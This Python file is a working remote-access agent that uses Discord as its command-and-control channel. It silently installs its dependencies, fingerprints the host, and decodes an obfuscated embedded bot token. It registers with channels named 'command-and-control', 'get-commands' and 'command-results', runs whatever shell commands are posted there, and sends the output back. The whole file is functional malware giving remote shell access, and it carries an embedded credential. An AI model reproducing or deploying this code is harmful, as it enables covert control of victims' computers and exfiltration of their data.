#!/usr/bin/env python3

import sys
import subprocess
import importlib.util
import os
import asyncio
import platform
import uuid
import hashlib
import re
import base64
from datetime import datetime
import time
import site
import shutil

# Debug log file
DEBUG_LOG = '/tmp/hooktest_main.log' if platform.system() != 'Windows' else os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'hooktest_main.log')

def log_debug(message):
    """Write debug message to log file"""
    try:
        log_dir = os.path.dirname(DEBUG_LOG)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
        
        with open(DEBUG_LOG, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

# Required modules
REQUIRED_PACKAGES = {
    "discord": "discord.py",
    "aiohttp": "aiohttp",
    "aiodns": "aiodns",  # aiohttp AsyncResolver üçün lazımdır
}

def is_venv_active():
    """Check if we're in a virtual environment"""
    return (hasattr(sys, 'real_prefix') or 
            (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix))

def get_base_python():
    """Get system Python (not venv Python)"""
    if is_venv_active():
        # Try to find system Python
        if platform.system() == "Windows":
            system_pythons = [
                "C:\\Python313\\python.exe",
                "C:\\Python312\\python.exe",
                "C:\\Python311\\python.exe",
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs\\Python\\Python*\\python.exe'),
            ]
        elif platform.system() == "Darwin":  # macOS
            system_pythons = [
                "/usr/local/bin/python3",
                "/opt/homebrew/bin/python3",
                "/usr/bin/python3",
                "/Library/Frameworks/Python.framework/Versions/3.*/bin/python3",
            ]
        else:  # Linux
            system_pythons = [
                "/usr/bin/python3",
                "/usr/local/bin/python3",
            ]
        
        import glob
        for pattern in system_pythons:
            for path in glob.glob(pattern):
                if os.path.exists(path):
                    try:
                        result = subprocess.run(
                            [path, "--version"],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            timeout=3,
                            text=True
                        )
                        if result.returncode == 0:
                            log_debug(f"Found system Python: {path}")
                            return path
                    except:
                        continue
    
    return sys.executable

def find_python_executable():
    """Find the correct Python executable - prefer system Python over venv"""
    # Əgər venv-dəsə, system Python-u tap
    if is_venv_active():
        log_debug("Virtual environment detected, searching for system Python...")
        system_python = get_base_python()
        if system_python != sys.executable:
            log_debug(f"Using system Python: {system_python}")
            return system_python
    
    python_exes = [
        sys.executable,
        "python3",
        "python",
        "/usr/bin/python3",
        "/usr/local/bin/python3",
        "/opt/homebrew/bin/python3",
        "python3.13",
        "python3.12",
        "python3.11",
    ]
    
    for exe in python_exes:
        try:
            result = subprocess.run(
                [exe, "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=3,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"Found Python: {exe} -> {result.stdout.strip()}")
                return exe
        except:
            continue
    
    log_debug("Using sys.executable as fallback")
    return sys.executable

def find_working_pip():
    """Find ANY working pip on the system"""
    python_exe = find_python_executable()
    log_debug(f"Testing pip with Python: {python_exe}")
    
    # Method 1: Python -m pip (ən etibarlı)
    test_commands = [
        [python_exe, "-m", "pip"],
        [python_exe, "-m", "pip3"],
    ]
    
    for cmd in test_commands:
        try:
            result = subprocess.run(
                cmd + ["--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"✓ Working pip found: {' '.join(cmd)} -> {result.stdout.strip()}")
                return cmd
        except Exception as e:
            log_debug(f"Failed {' '.join(cmd)}: {e}")
    
    # Method 2: Standalone pip əmrləri
    pip_commands = ["pip3", "pip", "pip3.13", "pip3.12", "pip3.11"]
    
    for pip_cmd in pip_commands:
        try:
            result = subprocess.run(
                [pip_cmd, "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                text=True
            )
            if result.returncode == 0:
                log_debug(f"✓ Working pip: {pip_cmd} -> {result.stdout.strip()}")
                return [pip_cmd]
        except:
            continue
    
    # Method 3: ensurepip ilə pip qur
    log_debug("No pip found, attempting to bootstrap pip...")
    try:
        result = subprocess.run(
            [python_exe, "-m", "ensurepip", "--default-pip"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=60,
            text=True
        )
        log_debug(f"ensurepip output: {result.stdout}")
        log_debug(f"ensurepip errors: {result.stderr}")
        
        # Yenə yoxla
        result = subprocess.run(
            [python_exe, "-m", "pip", "--version"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
            text=True
        )
        if result.returncode == 0:
            log_debug("✓ Successfully bootstrapped pip!")
            return [python_exe, "-m", "pip"]
    except Exception as e:
        log_debug(f"ensurepip failed: {e}")
    
    # Method 4: get-pip.py endirməyə çalış
    log_debug("Attempting to download and install pip via get-pip.py...")
    try:
        import urllib.request
        import tempfile
        
        get_pip_url = "https://bootstrap.pypa.io/get-pip.py"
        temp_file = os.path.join(tempfile.gettempdir(), "get-pip.py")
        
        log_debug(f"Downloading get-pip.py to {temp_file}")
        urllib.request.urlretrieve(get_pip_url, temp_file)
        
        result = subprocess.run(
            [python_exe, temp_file, "--user"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=120,
            text=True
        )
        
        log_debug(f"get-pip.py result: {result.returncode}")
        
        # Yenidən yoxla
        result = subprocess.run(
            [python_exe, "-m", "pip", "--version"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
            text=True
        )
        if result.returncode == 0:
            log_debug("✓ Pip installed via get-pip.py!")
            return [python_exe, "-m", "pip"]
            
        # Cleanup
        if os.path.exists(temp_file):
            os.remove(temp_file)
            
    except Exception as e:
        log_debug(f"get-pip.py installation failed: {e}")
    
    log_debug("❌ Could not find or install pip")
    return None

def get_user_site_packages():
    """Get user site-packages directory"""
    try:
        python_exe = find_python_executable()
        result = subprocess.run(
            [python_exe, "-m", "site", "--user-site"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
            text=True
        )
        if result.returncode == 0:
            user_site = result.stdout.strip()
            log_debug(f"User site-packages: {user_site}")
            return user_site
    except Exception as e:
        log_debug(f"Failed to get user site: {e}")
    
    # Fallback
    home = os.path.expanduser("~")
    if platform.system() == "Windows":
        return os.path.join(home, "AppData", "Roaming", "Python", f"Python{sys.version_info.major}{sys.version_info.minor}", "site-packages")
    else:
        return os.path.join(home, ".local", "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")

def ensure_user_site_exists():
    """Make sure user site-packages exists"""
    user_site = get_user_site_packages()
    if not os.path.exists(user_site):
        try:
            os.makedirs(user_site, exist_ok=True)
            log_debug(f"Created user site-packages: {user_site}")
        except Exception as e:
            log_debug(f"Failed to create user site: {e}")
    return user_site

def install_package_robust(module_name, package_name):
    """Ultra-robust package installation"""
    log_debug(f"=== Installing {package_name} ===")
    
    pip_cmd = find_working_pip()
    if not pip_cmd:
        log_debug("❌ No pip available - CANNOT INSTALL")
        return False
    
    # User site-packages əmin ol
    user_site = ensure_user_site_exists()
    
    # İnstallasiya strategiyaları
    strategies = [
        # Strategy 1: User install (ən təhlükəsiz)
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--no-warn-script-location"],
            "name": "user install"
        },
        # Strategy 2: User install + force reinstall
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--force-reinstall", "--no-cache-dir"],
            "name": "user force reinstall"
        },
        # Strategy 3: Target install
        {
            "cmd": pip_cmd + ["install", package_name, "--target", user_site, "--upgrade"],
            "name": "target install"
        },
        # Strategy 4: Break system packages (Debian/Ubuntu)
        {
            "cmd": pip_cmd + ["install", package_name, "--user", "--break-system-packages"],
            "name": "break-system-packages"
        },
        # Strategy 5: System-wide (admin lazım ola bilər)
        {
            "cmd": pip_cmd + ["install", package_name],
            "name": "system-wide"
        },
    ]
    
    for strategy in strategies:
        try:
            log_debug(f"Trying: {strategy['name']}")
            log_debug(f"Command: {' '.join(strategy['cmd'])}")
            
            result = subprocess.run(
                strategy['cmd'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=180,
                text=True
            )
            
            log_debug(f"Return code: {result.returncode}")
            if result.stdout:
                log_debug(f"STDOUT: {result.stdout[:500]}")
            if result.stderr:
                log_debug(f"STDERR: {result.stderr[:500]}")
            
            if result.returncode == 0 or "Successfully installed" in result.stdout:
                log_debug(f"✓ SUCCESS: {strategy['name']}")
                time.sleep(2)  # Filesystem sync
                return True
            
        except subprocess.TimeoutExpired:
            log_debug(f"✗ TIMEOUT: {strategy['name']}")
        except Exception as e:
            log_debug(f"✗ EXCEPTION: {strategy['name']} - {e}")
    
    log_debug(f"❌ All strategies failed for {package_name}")
    return False

def add_all_paths_to_sys():
    """Add all possible package locations to sys.path"""
    paths_to_add = []
    
    # User site
    try:
        user_site = site.getusersitepackages()
        if user_site:
            paths_to_add.append(user_site)
    except:
        pass
    
    # System sites
    try:
        for site_path in site.getsitepackages():
            paths_to_add.append(site_path)
    except:
        pass
    
    # Manual user site
    user_site_manual = get_user_site_packages()
    paths_to_add.append(user_site_manual)
    
    # Common paths
    home = os.path.expanduser("~")
    if platform.system() == "Darwin":  # macOS
        import glob
        patterns = [
            os.path.join(home, "Library/Python/*/lib/python/site-packages"),
            "/Library/Python/*/site-packages",
            "/usr/local/lib/python*/site-packages",
            "/opt/homebrew/lib/python*/site-packages",
        ]
        for pattern in patterns:
            paths_to_add.extend(glob.glob(pattern))
    
    # Add to sys.path
    added = 0
    for path in paths_to_add:
        if os.path.isdir(path) and path not in sys.path:
            sys.path.insert(0, path)
            added += 1
            log_debug(f"Added to sys.path: {path}")
    
    log_debug(f"Total paths added: {added}")
    importlib.invalidate_caches()

def check_and_install_packages():
    """Check and install missing packages"""
    log_debug("=== PACKAGE CHECK ===")
    log_debug(f"Python: {sys.version}")
    log_debug(f"Platform: {platform.system()} {platform.release()}")
    log_debug(f"Virtual env: {is_venv_active()}")
    
    try:
        # sys.path-ə bütün pathlar əlavə et
        add_all_paths_to_sys()
        
        # Hansı paketlər yoxdur
        missing = []
        for module_name, package_name in REQUIRED_PACKAGES.items():
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                missing.append((module_name, package_name))
                log_debug(f"✗ Missing: {package_name}")
            else:
                log_debug(f"✓ Found: {module_name}")
        
        if not missing:
            log_debug("✓ All packages already installed!")
            return True
        
        log_debug(f"Need to install: {[p[1] for p in missing]}")
        
        # Qur
        for module_name, package_name in missing:
            if not install_package_robust(module_name, package_name):
                log_debug(f"Failed to install {package_name}")
        
        # Yoxla
        log_debug("=== VERIFICATION ===")
        add_all_paths_to_sys()
        time.sleep(2)
        
        still_missing = []
        for module_name, package_name in missing:
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                still_missing.append(package_name)
                log_debug(f"✗ Still missing: {package_name}")
            else:
                log_debug(f"✓ Verified: {module_name}")
        
        if still_missing:
            log_debug(f"❌ Failed to install: {still_missing}")
            return False
        
        log_debug("✓ All packages installed successfully!")
        return True
        
    except Exception as e:
        log_debug(f"Exception: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return False

def import_discord_modules():
    """Import Discord modules"""
    try:
        global discord, aiohttp
        
        add_all_paths_to_sys()
        
        log_debug("Importing discord...")
        import discord
        log_debug(f"✓ discord {discord.__version__}")
        
        log_debug("Importing aiohttp...")
        import aiohttp
        log_debug(f"✓ aiohttp {aiohttp.__version__}")
        
        return True
        
    except ImportError as e:
        log_debug(f"Import error: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return False
    except Exception as e:
        log_debug(f"Unexpected error: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return False

# Client globals
SESSION_ID = None
CLIENT_INFO = None
COMMAND_AND_CONTROL_CHANNEL = None
GET_COMMANDS_CHANNEL = None
COMMAND_RESULTS_CHANNEL = None
last_processed_message_id = None

def generate_session_id():
    """Generate unique session ID"""
    try:
        system_info = (
            platform.system() +
            platform.node() +
            platform.machine() +
            platform.release() +
            str(uuid.getnode())
        )
        hashed = hashlib.sha256(system_info.encode()).hexdigest()
        session_id = "session_" + hashed
        log_debug(f"Session ID: {session_id}")
        return session_id
    except Exception as e:
        log_debug(f"Error generating session ID: {e}")
        return "session_" + str(uuid.uuid4())

async def create_client():
    """Create Discord client"""
    try:
        log_debug("Creating Discord client...")
        
        # AsyncResolver istifadə etməyə çalış, əgər aiodns yoxdursa sadə connector istifadə et
        connector = None
        try:
            connector = aiohttp.TCPConnector(
                resolver=aiohttp.AsyncResolver(nameservers=['8.8.8.8', '1.1.1.1']),
                family=0,
                ssl=False
            )
            log_debug("✓ Using AsyncResolver with custom DNS")
        except (RuntimeError, ImportError) as e:
            log_debug(f"AsyncResolver not available ({e}), using default connector")
            connector = aiohttp.TCPConnector(
                family=0,
                ssl=False
            )
        
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        
        client = discord.Client(intents=intents, connector=connector)
        log_debug("✓ Discord client created")
        return client
    except Exception as e:
        log_debug(f"Failed to create client: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return None

async def register_session(guild, client_instance):
    """Register session"""
    try:
        log_debug(f"Registering with guild: {guild.name}")
        channel = guild.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(f'/register {SESSION_ID} {CLIENT_INFO}')
            log_debug("✓ Registration sent")
    except Exception as e:
        log_debug(f"Registration failed: {e}")

def parse_command_message(content):
    """Parse command message"""
    try:
        lines = content.split('\n')
        command_id = None
        session = None
        command = None
        
        for line in lines:
            if 'Command ID:' in line:
                command_id = line.split('Command ID:')[1].strip()
            elif 'Session:' in line:
                m = re.search(r"session_[0-9a-fA-F]{64}", line)
                session = m.group(0) if m else None
            elif 'Command:' in line:
                match = re.search(r"```(.*?)```", content, re.DOTALL)
                if match:
                    command = match.group(1).strip()
        
        if command_id and session and command:
            return {
                'command_id': command_id,
                'session': session,
                'command': command
            }
        return None
    except Exception as e:
        log_debug(f"Parse error: {e}")
        return None

async def execute_command(command):
    """Execute system command"""
    try:
        log_debug(f"Executing: {command[:50]}...")
        
        if platform.system() == 'Windows':
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        else:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                executable='/bin/bash'
            )
        
        stdout, stderr = process.communicate(timeout=30)
        
        if process.returncode == 0:
            result = stdout if stdout else 'Success'
        else:
            result = f'Error: {stderr if stderr else "Failed"}'
        
        if len(result) > 1900:
            result = result[:1900] + '\n...(truncated)'
        
        log_debug(f"Result: {result[:100]}...")
        return result
        
    except subprocess.TimeoutExpired:
        return 'Error: Timeout'
    except Exception as e:
        log_debug(f"Execution error: {e}")
        return f'Error: {str(e)}'

async def send_response(command_id, command, response, client_instance):
    """Send command response"""
    try:
        log_debug(f"Sending response for {command_id}")
        
        channel = client_instance.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(
                f'**Response for {command_id}**\n'
                f'**Session:** {SESSION_ID}\n'
                f'**Command:** ```{command[:100]}```\n'
                f'**Response:** ```{response}```'
            )
        
        results_channel = client_instance.get_channel(COMMAND_RESULTS_CHANNEL)
        if results_channel:
            await results_channel.send(
                f'**Command ID:** {command_id}\n'
                f'**Session:** {SESSION_ID}\n'
                f'**Command:** ```{command}```\n'
                f'**Response:** ```{response}```\n'
                f'**Timestamp:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            )
            
    except Exception as e:
        log_debug(f"Failed to send response: {e}")

async def poll_commands(client_instance):
    """Poll for commands"""
    global last_processed_message_id
    
    try:
        log_debug("Starting command polling")
        await asyncio.sleep(5)
        
        while True:
            try:
                channel = client_instance.get_channel(GET_COMMANDS_CHANNEL)
                if not channel:
                    await asyncio.sleep(10)
                    continue
                
                messages = [msg async for msg in channel.history(limit=1)]
                
                if messages:
                    latest_message = messages[0]
                    
                    if last_processed_message_id != latest_message.id:
                        command_data = parse_command_message(latest_message.content)
                        
                        if command_data and command_data["session"] == SESSION_ID:
                            log_debug(f"Executing command {command_data['command_id']}")
                            response = await execute_command(command_data['command'])
                            await send_response(
                                command_data['command_id'],
                                command_data['command'],
                                response,
                                client_instance
                            )
                            last_processed_message_id = latest_message.id
                
                await asyncio.sleep(3)
                
            except Exception as e:
                log_debug(f"Poll error: {e}")
                await asyncio.sleep(10)
                
    except Exception as e:
        log_debug(f"Fatal poll error: {e}")

async def setup_client_events(client_instance):
    """Setup event handlers"""
    global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
    
    @client_instance.event
    async def on_ready():
        global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
        
        try:
            log_debug(f"Connected as {client_instance.user.name}")
            
            guild = client_instance.guilds[0] if client_instance.guilds else None
            if guild:
                for channel in guild.text_channels:
                    if channel.name == 'command-and-control':
                        COMMAND_AND_CONTROL_CHANNEL = channel.id
                    elif channel.name == 'get-commands':
                        GET_COMMANDS_CHANNEL = channel.id
                    elif channel.name == 'command-results':
                        COMMAND_RESULTS_CHANNEL = channel.id
                
                if all([COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL]):
                    await register_session(guild, client_instance)
                    client_instance.loop.create_task(poll_commands(client_instance))
                    log_debug("✓ Polling started")
                
        except Exception as e:
            log_debug(f"on_ready error: {e}")

async def run_discord_client():
    """Run Discord client"""
    global SESSION_ID, CLIENT_INFO
    
    try:
        log_debug("=== DISCORD AGENT STARTING ===")
        
        # Install
        if not check_and_install_packages():
            log_debug("Failed to install dependencies")
        
        # Import
        if not import_discord_modules():
            log_debug("❌ Cannot import Discord modules")
            return
        
        # Setup
        SESSION_ID = generate_session_id()
        CLIENT_INFO = f'{platform.system()} {platform.release()} - {platform.node()}'
        
        TOKEN = base64.b64decode(
            "TVRRek5UazBPVGcwTURjeE56VTRNalE0T1EuR3F4OW11LnRHeno5alVEZTVGeGhJc19Oa0h2MFA5WmxpT2o3X1o0LVVOdXF3"
        ).decode('utf-8')
        
        # Run
        client = await create_client()
        if not client:
            log_debug("❌ Cannot create client")
            return
        
        await setup_client_events(client)
        await client.start(TOKEN)
        
    except Exception as e:
        log_debug(f"Fatal error: {e}")
        import traceback
        log_debug(traceback.format_exc())

def start_discord_agent():
    """Entry point"""
    try:
        log_debug("=== START ===")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_discord_client())
    except Exception as e:
        log_debug(f"Error: {e}")
        import traceback
        log_debug(traceback.format_exc())

if __name__ == "__main__":
    start_discord_agent()